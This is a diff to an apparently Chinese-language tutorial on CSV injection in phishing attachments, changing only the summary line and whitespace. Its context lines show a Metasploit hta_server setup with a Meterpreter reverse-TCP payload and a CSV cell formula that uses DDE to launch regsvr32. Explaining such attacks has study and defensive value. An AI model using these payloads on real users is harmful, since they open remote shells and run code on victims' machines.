@@ -6,7 +6,7 @@ tags:
   - 钓鱼附件
   - Office
   - CSV
-excerpt: CSV(Comma-Separated Values) 是一种用来存储数据的纯文本格式文件。
+excerpt: CSV 注入利用 Excel 公式功能在单元格中嵌入恶意命令，打开文件时可触发 DDE 或系统命令执行。
 ---
 
 # CSV
@@ -105,7 +105,7 @@ use exploit/windows/misc/hta_server
 # 设置srvhost和srvport绑定一个web服务让目标访问
 msf exploit(windows/misc/hta_server) > set srvhost 100.1.1.131
 # 使用的攻击载荷
-set payload windows/x64/meterpreter/reverse_tcp  
+set payload windows/x64/meterpreter/reverse_tcp
 #默认是x86的,选择x64
 set target 1
 # 绑定攻击机IP
@@ -202,38 +202,3 @@ fillerText1,fillerText2,fillerText3,=MSEXCEL|'\..\..\..\Windows\System32\regsvr3
 ```
 
 ---
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
